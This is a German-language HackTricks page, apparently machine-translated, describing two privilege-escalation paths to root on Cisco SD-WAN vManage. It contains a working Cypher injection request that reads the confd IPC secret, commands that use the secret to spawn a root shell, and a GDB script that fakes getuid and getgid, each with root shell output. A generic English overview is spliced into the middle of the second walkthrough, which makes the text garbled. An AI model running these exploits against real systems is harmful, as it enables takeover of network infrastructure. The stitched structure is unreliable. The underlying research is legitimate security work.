# Cisco - vmanage

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

## Pfad 1

(Beispiel von [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nachdem wir uns etwas durch einige [Dokumentation](http://66.218.245.39/doc/html/rn03re18.html) im Zusammenhang mit `confd` und den verschiedenen Binärdateien (zugänglich mit einem Konto auf der Cisco-Website) gegraben haben, haben wir festgestellt, dass zur Authentifizierung des IPC-Sockets ein geheimes Passwort verwendet wird, das sich in `/etc/confd/confd_ipc_secret` befindet:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Erinnere dich an unsere Neo4j-Instanz? Sie läuft unter den Berechtigungen des Benutzers `vmanage`, was es uns ermöglicht, die Datei mithilfe der vorherigen Schwachstelle abzurufen:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Das Programm `confd_cli` unterstützt keine Befehlszeilenargumente, sondern ruft `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir direkt `/usr/bin/confd_cli_user` mit unseren eigenen Argumenten aufrufen. Allerdings ist es mit unseren aktuellen Berechtigungen nicht lesbar, daher müssen wir es aus dem Rootfs abrufen und mit scp kopieren, die Hilfe lesen und sie verwenden, um die Shell zu erhalten:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pfad 2

(Beispiel von [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Das Blog¹ des Synacktiv-Teams beschreibt einen eleganten Weg, um eine Root-Shell zu erhalten, jedoch erfordert dies das Kopieren von `/usr/bin/confd_cli_user`, das nur von Root lesbar ist. Ich habe einen anderen Weg gefunden, um ohne solchen Aufwand zu Root zu eskalieren.

Als ich die Binärdatei `/usr/bin/confd_cli` disassemblierte, habe ich Folgendes beobachtet:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
Wenn ich "ps aux" ausführe, habe ich Folgendes beobachtet (_Hinweis -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ich habe die Hypothese aufgestellt, dass das Programm "confd_cli" die Benutzer-ID und die Gruppen-ID, die es vom angemeldeten Benutzer gesammelt hat, an die Anwendung "cmdptywrapper" übergibt.

Mein erster Versuch bestand darin, "cmdptywrapper" direkt auszuführen und es mit "-g 0 -u 0" zu versorgen, aber es ist fehlgeschlagen. Es scheint, dass irgendwo auf dem Weg ein Dateideskriptor (-i 1015) erstellt wurde und ich kann ihn nicht fälschen.

Wie in Synacktivs Blog erwähnt (letztes Beispiel), unterstützt das Programm "confd_cli" keine Befehlszeilenargumente, aber ich kann es mit einem Debugger beeinflussen und zum Glück ist GDB im System enthalten.

Ich habe ein GDB-Skript erstellt, in dem ich die API "getuid" und "getgid" erzwungen habe, 0 zurückzugeben. Da ich bereits die "vmanage"-Berechtigung durch die Deserialisierungs-RCE habe, habe ich die Berechtigung, direkt auf das Verzeichnis "/etc/confd/confd_ipc_secret" zuzugreifen.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
# Cisco vManage

## Introduction

Cisco vManage is a cloud-based network management platform that provides centralized control and monitoring of Cisco SD-WAN devices. It allows network administrators to configure, monitor, and troubleshoot their SD-WAN infrastructure.

## Privilege Escalation

### Exploiting Misconfigurations

#### Default Credentials

Cisco vManage may have default credentials configured, which can be exploited to gain unauthorized access. Attackers can try common default usernames and passwords to gain administrative privileges.

#### Insecure File Permissions

Improper file permissions on sensitive files can allow unauthorized users to read or modify them. Attackers can exploit this by gaining access to sensitive configuration files or scripts, which may contain credentials or other sensitive information.

### Exploiting Vulnerabilities

#### Remote Code Execution

If Cisco vManage is running a vulnerable version, attackers can exploit remote code execution vulnerabilities to execute arbitrary commands with administrative privileges. This can be achieved by sending specially crafted requests to the vulnerable application.

#### SQL Injection

SQL injection vulnerabilities in Cisco vManage can allow attackers to execute arbitrary SQL queries, potentially leading to unauthorized access or data leakage. Attackers can exploit this by injecting malicious SQL statements into user input fields.

## Mitigation

To mitigate privilege escalation attacks on Cisco vManage, the following measures can be taken:

- Change default credentials and use strong, unique passwords for all accounts.
- Ensure proper file permissions are set on sensitive files, limiting access to authorized users only.
- Keep Cisco vManage up to date with the latest security patches to prevent exploitation of known vulnerabilities.
- Regularly review and audit the configuration of Cisco vManage to identify and fix any misconfigurations or vulnerabilities.

## Conclusion

Privilege escalation attacks on Cisco vManage can lead to unauthorized access, data leakage, and compromise of the SD-WAN infrastructure. By following the mitigation measures mentioned above, network administrators can enhance the security of their Cisco vManage deployment and protect against such attacks.
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com).
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
